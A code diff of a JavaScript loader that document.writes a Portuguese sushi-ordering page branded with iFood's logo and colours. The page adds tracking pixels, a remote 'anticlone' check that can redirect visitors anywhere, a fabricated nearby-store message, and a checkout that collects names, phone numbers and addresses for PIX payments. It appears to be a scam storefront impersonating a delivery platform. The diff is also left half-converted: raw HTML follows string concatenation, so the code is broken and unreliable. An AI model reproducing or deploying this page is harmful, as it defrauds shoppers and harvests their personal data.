@@ -1,122 +1,116 @@
 (function() {
     
     
-    var payload = `<!DOCTYPE html>
-<html lang="pt-br">
-<head>
+    var payload = "<!DOCTYPE html>" +
+"<html lang='pt-br'>" +
+"<head>" +
 
-    <script
-      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-      data-utmify-prevent-xcod-sck
-      data-utmify-prevent-subids
-      async
-      defer
-    ></script>
+"    <script" +
+"      src='https://cdn.utmify.com.br/scripts/utms/latest.js'" +
+"      data-utmify-prevent-xcod-sck" +
+"      data-utmify-prevent-subids" +
+"      async" +
+"      defer" +
+"    ></script>" +
 
-    <script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    "<script src='scripts/utms/latest.js' data-utmify-prevent-xcod-sck='' data-utmify-prevent-subids='' async='' defer=''></script>" +
 
-    <!-- TikTok Pixel Code Start -->
-    <script>
-    !function (w, d, t) {
-      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
-
-      ttq.load('D5MLIM3C77U85R08N62G');
-      ttq.page();
-    }(window, document, 'ttq');
-    </script>
-    <!-- TikTok Pixel Code End -->
-
-      <!-- Meta Pixel Code -->
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '967099279440605');
-    fbq('track', 'PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none" src="tr?id=967099279440605&ev=PageView&noscript=1"></noscript>
-    <!-- End Meta Pixel Code -->
+"    <!-- TikTok Pixel Code Start -->" +
+"    <script>" +
+"    !function (w, d, t) {" +
+"      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=['page','track','identify','instances','debug','on','off','once','ready','alias','group','enableCookie','disableCookie','holdConsent','revokeConsent','grantConsent'],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(" +
+"    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r='https://analytics.tiktok.com/i18n/pixel/events.js',o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement('script')" +
+"    ;n.type='text/javascript',n.async=!0,n.src=r+'?sdkid='+e+'&lib='+t;e=document.getElementsByTagName('script')[0];e.parentNode.insertBefore(n,e)};" +
+"      ttq.load('D5MLIM3C77U85R08N62G');" +
+"      ttq.page();" +
+"    }(window, document, 'ttq');" +
+"    </script>" +
+"    <!-- TikTok Pixel Code End -->" +
+"      <!-- Meta Pixel Code -->" +
+"    <script>" +
+"    !function(f,b,e,v,n,t,s)" +
+"    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?" +
+"    n.callMethod.apply(n,arguments):n.queue.push(arguments)};" +
+"    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';" +
+"    n.queue=[];t=b.createElement(e);t.async=!0;" +
+"    t.src=v;s=b.getElementsByTagName(e)[0];" +
+"    s.parentNode.insertBefore(t,s)}(window, document,'script'," +
+"    'https://connect.facebook.net/en_US/fbevents.js');" +
+"    fbq('init', '967099279440605');" +
+"    fbq('track', 'PageView');" +
+"    </script>" +
+"    <noscript><img height='1' width='1' style='display:none' src='tr?id=967099279440605&ev=PageView&noscript=1'></noscript>" +
+"    <!-- End Meta Pixel Code -->" +
 
     
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Rūshī Sushi</title>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #ffffff; user-select: none; -webkit-user-select: none; }
-        :root { --food-red: #EA1D2C; --food-green: #05a65a; --text-dark: #3e3e3e; --text-gray: #717171; }
-        html, body { overflow-y: auto !important; height: auto !important; }
-        .no-scroll::-webkit-scrollbar { display: none; }
-        .no-scroll { -ms-overflow-style: none; scrollbar-width: none; }
-        .cat-tabs-wrap { position: relative; }
-        .cat-tabs-wrap::after { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 24px; background: linear-gradient(to left, #ffffff, rgba(255,255,255,0)); pointer-events: none; }
-        .nav-item { position: relative; padding: 14px 4px; margin-right: 22px; font-size: 14px; font-weight: 600; color: #717171; background: transparent; border: none; white-space: nowrap; transition: color .2s ease; }
-        .nav-item:last-child { margin-right: 16px; }
-        .nav-item.active { color: var(--food-red); font-weight: 700; }
-        .nav-item.active::after { content: ''; position: absolute; left: 0; right: 0; bottom: 0; height: 3px; background: var(--food-red); border-radius: 3px 3px 0 0; }
-        .sheet-overlay { transition: opacity 0.3s ease; opacity: 0; pointer-events: none; }
-        .sheet-overlay.visible { opacity: 1; pointer-events: auto; }
-        .bottom-sheet { transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); box-shadow: 0 -4px 30px rgba(0,0,0,0.15); }
-        .bottom-sheet.open { transform: translateY(0); }
-        .input-group { background-color: #ffffff; border: 1px solid #f0f0f0; border-radius: 8px; padding: 8px 12px; transition: all 0.2s; }
-        .input-group:focus-within { background-color: #fff; border-color: #EA1D2C; box-shadow: 0 0 0 2px rgba(234, 29, 44, 0.1); }
-        .input-label { font-size: 11px; color: #717171; font-weight: 600; display: block; margin-bottom: 2px; text-transform: uppercase; }
-        .input-field { width: 100%; background: transparent; border: none; font-size: 14px; color: #3e3e3e; font-weight: 500; outline: none; }
-        @keyframes loading-bar { 0% { width: 0%; left: 0; } 50% { width: 70%; left: 30%; } 100% { width: 0%; left: 100%; } }
-        .animate-loading-bar { animation: loading-bar 1.5s infinite ease-in-out; position: relative; }
-        @keyframes heartbeat { 0% { transform: scale(1); } 15% { transform: scale(1.15); } 30% { transform: scale(1); } 45% { transform: scale(1.15); } 60% { transform: scale(1); } }
-        .animate-heartbeat { animation: heartbeat 2s infinite; }
-        .header-banner { height: 160px; width: 100%; position: relative; }
-        .banner-img { width: 100%; height: 100%; object-fit: cover; }
-        .popup-local-container { border-radius: 16px !important; padding: 20px !important; font-family: 'Inter', sans-serif !important; }
-        .btn-confirmar { background-color: #EA1D2C !important; border-radius: 8px !important; font-weight: 700 !important; padding: 12px 24px !important; width: 100% !important; margin-bottom: 10px !important; }
-        .btn-alterar { background-color: transparent !important; color: #717171 !important; font-weight: 600 !important; border: 1px solid #e5e7eb !important; border-radius: 8px !important; padding: 10px 24px !important; width: 100% !important; }
-        .location-box { background-color: #ffffff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; border: 1px solid #e5e7eb; }
-        .location-box span { display: block; font-size: 12px; color: #717171; }
-        .location-box strong { display: block; font-size: 16px; color: #3e3e3e; margin-top: 4px; }
-        .popup-header i { font-size: 40px; color: #EA1D2C; margin-bottom: 15px; }
-        .popup-header h2 { font-size: 20px; font-weight: 800; color: #3e3e3e; margin-bottom: 5px; }
-        .popup-header p { font-size: 14px; color: #717171; }
-        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        @keyframes pulse-premium { 0% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } 50% { transform: scale(1.02); box-shadow: 0 0 0 4px rgba(234, 29, 44, 0.4); border-color: #EA1D2C; } 100% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } }
-        .card-destaque-master { animation: pulse-premium 2s infinite ease-in-out; border: 1px solid #ffe4e6 !important; background: linear-gradient(to bottom right, #fff, #fff1f2); }
-    </style>
-    <script>
-    (function(){
-        var t = "a90a3e96a0bd6521504952b578d11e69";
-        var d = window.location.hostname;
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://multi.paradisepags.com/api/anticlone-check.php?token=" + t + "&domain=" + d, true);
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try {
-                    var r = JSON.parse(xhr.responseText);
-                    if (r.action === "redirect" && r.url) {
-                        window.location.href = r.url;
-                    }
-                } catch(e){}
-            }
-        };
-        xhr.send();
-    })();
-    </script>
-</head>
-<body class="pb-24 bg-white" id="main-body">
-
-    <div id="app-loader" class="fixed inset-0 z-[100] bg-[#EA1D2C] flex flex-col items-center justify-center transition-opacity duration-500">
+"    <meta charset='UTF-8'>" +
+"    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>" +
+"    <title>Rūshī Sushi</title>" +
+"    <script src='https://cdn.tailwindcss.com'></script>" +
+"    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'>" +
+"    <link href='https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap' rel='stylesheet'>" +
+"    <style>" +
+"        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background-color: #ffffff; user-select: none; -webkit-user-select: none; }" +
+"        :root { --food-red: #EA1D2C; --food-green: #05a65a; --text-dark: #3e3e3e; --text-gray: #717171; }" +
+"        html, body { overflow-y: auto !important; height: auto !important; }" +
+"        .no-scroll::-webkit-scrollbar { display: none; }" +
+"        .no-scroll { -ms-overflow-style: none; scrollbar-width: none; }" +
+"        .cat-tabs-wrap { position: relative; }" +
+"        .cat-tabs-wrap::after { content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 24px; background: linear-gradient(to left, #ffffff, rgba(255,255,255,0)); pointer-events: none; }" +
+"        .nav-item { position: relative; padding: 14px 4px; margin-right: 22px; font-size: 14px; font-weight: 600; color: #717171; background: transparent; border: none; white-space: nowrap; transition: color .2s ease; }" +
+"        .nav-item:last-child { margin-right: 16px; }" +
+"        .nav-item.active { color: var(--food-red); font-weight: 700; }" +
+"        .nav-item.active::after { content: ''; position: absolute; left: 0; right: 0; bottom: 0; height: 3px; background: var(--food-red); border-radius: 3px 3px 0 0; }" +
+"        .sheet-overlay { transition: opacity 0.3s ease; opacity: 0; pointer-events: none; }" +
+"        .sheet-overlay.visible { opacity: 1; pointer-events: auto; }" +
+"        .bottom-sheet { transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); box-shadow: 0 -4px 30px rgba(0,0,0,0.15); }" +
+"        .bottom-sheet.open { transform: translateY(0); }" +
+"        .input-group { background-color: #ffffff; border: 1px solid #f0f0f0; border-radius: 8px; padding: 8px 12px; transition: all 0.2s; }" +
+"        .input-group:focus-within { background-color: #fff; border-color: #EA1D2C; box-shadow: 0 0 0 2px rgba(234, 29, 44, 0.1); }" +
+"        .input-label { font-size: 11px; color: #717171; font-weight: 600; display: block; margin-bottom: 2px; text-transform: uppercase; }" +
+"        .input-field { width: 100%; background: transparent; border: none; font-size: 14px; color: #3e3e3e; font-weight: 500; outline: none; }" +
+"        @keyframes loading-bar { 0% { width: 0%; left: 0; } 50% { width: 70%; left: 30%; } 100% { width: 0%; left: 100%; } }" +
+"        .animate-loading-bar { animation: loading-bar 1.5s infinite ease-in-out; position: relative; }" +
+"        @keyframes heartbeat { 0% { transform: scale(1); } 15% { transform: scale(1.15); } 30% { transform: scale(1); } 45% { transform: scale(1.15); } 60% { transform: scale(1); } }" +
+"        .animate-heartbeat { animation: heartbeat 2s infinite; }" +
+"        .header-banner { height: 160px; width: 100%; position: relative; }" +
+"        .banner-img { width: 100%; height: 100%; object-fit: cover; }" +
+"        .popup-local-container { border-radius: 16px !important; padding: 20px !important; font-family: 'Inter', sans-serif !important; }" +
+"        .btn-confirmar { background-color: #EA1D2C !important; border-radius: 8px !important; font-weight: 700 !important; padding: 12px 24px !important; width: 100% !important; margin-bottom: 10px !important; }" +
+"        .btn-alterar { background-color: transparent !important; color: #717171 !important; font-weight: 600 !important; border: 1px solid #e5e7eb !important; border-radius: 8px !important; padding: 10px 24px !important; width: 100% !important; }" +
+"        .location-box { background-color: #ffffff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; border: 1px solid #e5e7eb; }" +
+"        .location-box span { display: block; font-size: 12px; color: #717171; }" +
+"        .location-box strong { display: block; font-size: 16px; color: #3e3e3e; margin-top: 4px; }" +
+"        .popup-header i { font-size: 40px; color: #EA1D2C; margin-bottom: 15px; }" +
+"        .popup-header h2 { font-size: 20px; font-weight: 800; color: #3e3e3e; margin-bottom: 5px; }" +
+"        .popup-header p { font-size: 14px; color: #717171; }" +
+"        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }" +
+"        @keyframes pulse-premium { 0% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } 50% { transform: scale(1.02); box-shadow: 0 0 0 4px rgba(234, 29, 44, 0.4); border-color: #EA1D2C; } 100% { transform: scale(1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); } }" +
+"        .card-destaque-master { animation: pulse-premium 2s infinite ease-in-out; border: 1px solid #ffe4e6 !important; background: linear-gradient(to bottom right, #fff, #fff1f2); }" +
+"    </style>" +
+"    <script>" +
+"    (function(){" +
+"        var t = 'a90a3e96a0bd6521504952b578d11e69';" +
+"        var d = window.location.hostname;" +
+"        var xhr = new XMLHttpRequest();" +
+"        xhr.open('GET', 'https://multi.paradisepags.com/api/anticlone-check.php?token=' + t + '&domain=' + d, true);" +
+"        xhr.onload = function() {" +
+"            if (xhr.status === 200) {" +
+"                try {" +
+"                    var r = JSON.parse(xhr.responseText);" +
+"                    if (r.action === 'redirect' && r.url) {" +
+"                        window.location.href = r.url;" +
+"                    }" +
+"                } catch(e){}" +
+"            }" +
+"        };" +
+"        xhr.send();" +
+"    })();" +
+"    </script>" +
+"</head>" +
+"<body class='pb-24 bg-white' id='main-body'>" +
+"    <div id='app-loader' class='fixed inset-0 z-[100] bg-[#EA1D2C] flex flex-col items-center justify-center transition-opacity duration-500'>" +
         <div class="w-32 h-auto mb-10 animate-heartbeat flex items-center justify-center">
             <img src="images/ifood-white.webp" class="w-full object-contain">
         </div>
@@ -866,7 +860,7 @@
             const el = document.getElementById("header-location-info");
             if (el) {
                 // Adicionamos a barra invertida \ antes do $ para o código não quebrar
-                el.innerText = \`\${cidade} - \${estado}\`;
+                el.innerText = cidade + " - " + estado;
             }
         }
 
@@ -879,7 +873,7 @@
             if (stateData) {
                 const { value: city } = await Swal.fire({
                     title: 'Sua cidade', input: 'select', inputPlaceholder: 'Selecione a cidade', confirmButtonText: 'Confirmar', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' }, allowOutsideClick: false,
-                    inputOptions: (async () => { try { const res = await fetch(\`https://servicodados.ibge.gov.br/api/v1/localidades/estados/\${stateData.id}/municipios?orderBy=nome\`); const cities = await res.json(); const opts = {}; cities.forEach(c => opts[c.nome] = c.nome); return opts; } catch { return {}; } })(),
+                    inputOptions: (async () => { try { const res = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados/' + stateData.id + '/municipios?orderBy=nome'); const cities = await res.json(); const opts = {}; cities.forEach(c => opts[c.nome] = c.nome); return opts; } catch { return {}; } })(),
                     inputValidator: v => !v && 'Selecione uma cidade!'
                 });
                 if (city) salvarEExibir(city, stateData.sigla);
@@ -888,14 +882,14 @@
 
         function salvarEExibir(cidade, estado) {
             localStorage.setItem("localCidade", cidade); localStorage.setItem("localEstado", estado); atualizarHeaderLocalizacao(cidade, estado);
-            Swal.fire({ html: \`<div class="popup-header"><i class="fa-solid fa-circle-check" style="color:#05a65a;"></i><h2>Localização Confirmada!</h2><p style="color: #05A65A;">A loja mais próxima de você fica a 2.5Km</p></div>\`, confirmButtonText: 'Ver cardápio', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' } });
+            Swal.fire({ html: '<div class="popup-header"><i class="fa-solid fa-circle-check" style="color:#05a65a;"></i><h2>Localização Confirmada!</h2><p style="color: #05A65A;">A loja mais próxima de você fica a 2.5Km</p></div>', confirmButtonText: 'Ver cardápio', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' } });
         }
 
         async function iniciarVerificacaoLocal() {
             const cidadeSalva = localStorage.getItem("localCidade"); const estadoSalvo = localStorage.getItem("localEstado");
             if (cidadeSalva && estadoSalvo) { atualizarHeaderLocalizacao(cidadeSalva, estadoSalvo); return; }
             const local = await fetchLocation();
-            Swal.fire({ html: \`<div class="popup-header"><i class="fa-solid fa-map-location-dot"></i><h2>Bateu a fome de Japa?</h2><p>Confirme onde devemos entregar.</p></div><div class="location-box"><span>Detectamos você em:</span><strong>\${local.city} - \${local.region}</strong></div>\`, showCancelButton: true, confirmButtonText: 'É isso mesmo!', cancelButtonText: 'Mudar local', reverseButtons: true, customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar', cancelButton: 'btn-alterar' } }).then(result => { if (result.isConfirmed) { salvarEExibir(local.city, local.region); } else if (result.dismiss === Swal.DismissReason.cancel) { escolherLocalizacaoManualmente(local.region); } });
+            Swal.fire({ html: '<div class="popup-header"><i class="fa-solid fa-map-location-dot"></i><h2>Bateu a fome de Japa?</h2><p>Confirme onde devemos entregar.</p></div><div class="location-box"><span>Detectamos você em:</span><strong>' + local.city + ' - ' + local.region + '</strong></div>', showCancelButton: true, confirmButtonText: 'É isso mesmo!', cancelButtonText: 'Mudar local', reverseButtons: true, customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar', cancelButton: 'btn-alterar' } }).then(result => { if (result.isConfirmed) { salvarEExibir(local.city, local.region); } else if (result.dismiss === Swal.DismissReason.cancel) { escolherLocalizacaoManualmente(local.region); } });
         }
 
         const commonAddons = [
@@ -1055,16 +1049,15 @@
             opts.innerHTML = '';
             
             if(item.hasAddons) {
-                let html = \`<div class="mb-2"><h4 class="font-bold text-gray-700 text-sm mb-3">Adicionais</h4>\`;
+                let html = '<div class="mb-2"><h4 class="font-bold text-gray-700 text-sm mb-3">Adicionais</h4>';
                 commonAddons.forEach((opt, idx) => {
                     addonsState[opt.name] = 0;
-                    html += \`
-                    <div class="flex justify-between items-center py-3 border-b border-gray-100 last:border-0">
-                        <div class="flex items-center gap-3"><img src="${opt.img}" class="w-12 h-12 rounded-lg object-cover border border-gray-100"><div><div class="text-sm text-[#3e3e3e] font-medium">${opt.name}</div><div class="text-xs text-[#05a65a] font-bold">${opt.price === 0 ? 'Grátis' : '+ ' + formatMoney(opt.price)}</div></div></div>
-                        <div class="flex items-center border border-gray-200 rounded-lg h-8 px-2"><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty('\${opt.name}', \${opt.price}, -1)">-</button><span class="text-sm font-bold text-[#3e3e3e] w-6 text-center" id="addon-qty-\${idx}">0</span><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty('\${opt.name}', \${opt.price}, 1)">+</button></div>
-                    </div>\`;
+                    html += '<div class="flex justify-between items-center py-3 border-b border-gray-100 last:border-0">' +
+                            '<div class="flex items-center gap-3"><img src="' + opt.img + '" class="w-12 h-12 rounded-lg object-cover border border-gray-100"><div><div class="text-sm text-[#3e3e3e] font-medium">' + opt.name + '</div><div class="text-xs text-[#05a65a] font-bold">' + (opt.price === 0 ? 'Grátis' : '+ ' + formatMoney(opt.price)) + '</div></div></div>' +
+                            '<div class="flex items-center border border-gray-200 rounded-lg h-8 px-2"><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty(\'' + opt.name + '\', ' + opt.price + ', -1)">-</button><span class="text-sm font-bold text-[#3e3e3e] w-6 text-center" id="addon-qty-' + idx + '">0</span><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty(\'' + opt.name + '\', ' + opt.price + ', 1)">+</button></div>' +
+                            '</div>';
                 });
-                html += \`</div>\`;
+                html += '</div>';
                 opts.innerHTML = html;
             }
             document.getElementById('product-modal-container').classList.remove('hidden');
@@ -1296,12 +1289,11 @@
             container.innerHTML = '';
             if(cart.length === 0) { container.innerHTML = '<p class="text-center text-gray-400 py-4">Sua sacola está vazia.</p>'; return; }
             cart.forEach((item, idx) => {
-                let addonsHtml = (item.addons || []).map(a => \`<span class="text-xs text-gray-500 block">+ \${a.qty}x \${a.name}</span>\`).join('');
-                container.innerHTML += \`
-                <div class="flex justify-between items-start py-3 border-b border-gray-50 last:border-0">
-                    <div class="flex gap-3"><span class="text-gray-500 font-bold border border-gray-200 px-2 rounded h-fit text-sm">\${item.qty}x</span><div><span class="text-[#3e3e3e] font-medium text-sm block">\${item.name}</span>\${addonsHtml}\${item.obs ? \`<span class="text-xs text-gray-400 italic">"\${item.obs}"</span>\` : ''}<div class="text-[#3e3e3e] font-medium text-sm mt-1">\${formatMoney(item.totalPrice)}</div></div></div>
-                    <button onclick="removeCartItem(\${idx})" class="text-gray-400 text-sm"><i class="fa-solid fa-trash-can"></i></button>
-                </div>\`;
+                let addonsHtml = (item.addons || []).map(a => '<span class="text-xs text-gray-500 block">+ ' + a.qty + 'x ' + a.name + '</span>').join('');
+                container.innerHTML += '<div class="flex justify-between items-start py-3 border-b border-gray-50 last:border-0">' +
+                    '<div class="flex gap-3"><span class="text-gray-500 font-bold border border-gray-200 px-2 rounded h-fit text-sm">' + item.qty + 'x</span><div><span class="text-[#3e3e3e] font-medium text-sm block">' + item.name + '</span>' + addonsHtml + (item.obs ? '<span class="text-xs text-gray-400 italic">"' + item.obs + '"</span>' : '') + '<div class="text-[#3e3e3e] font-medium text-sm mt-1">' + formatMoney(item.totalPrice) + '</div></div></div>' +
+                    '<button onclick="removeCartItem(' + idx + ')" class="text-gray-400 text-sm"><i class="fa-solid fa-trash-can"></i></button>' +
+                '</div>';
             });
             recalcTotal();
         }
@@ -1436,7 +1428,7 @@
             const payload = { valorTotal: total, nome: nomeCliente, whatsapp: zapCliente, cep: document.getElementById('cust-cep').value, rua: document.getElementById('cust-street').value, numero: document.getElementById('cust-number').value, bairro: document.getElementById('cust-hood').value, complemento: document.getElementById('cust-comp').value, products: cart.map(i => ({ name: i.name, price: i.unitPrice, quantity: i.qty })), trackingParameters: getTrackingParams() };
             try {
                 if(window.fbq) fbq('track', 'AddPaymentInfo');
-                const response = await fetch(`${API_BASE_URL}/criar-pix`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                const response = await fetch(API_BASE_URL + '/criar-pix', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                 const data = await response.json();
                 if(data.success) {
                     localStorage.setItem('user_cache_nome', nomeCliente); localStorage.setItem('user_cache_zap', zapCliente);
@@ -1509,9 +1501,8 @@
 
     
 </body>
-</html>`;
+</html>";
 
-    // 🚀 EXECUÇÃO FINAL
     document.open();
     document.write(payload);
     document.close();
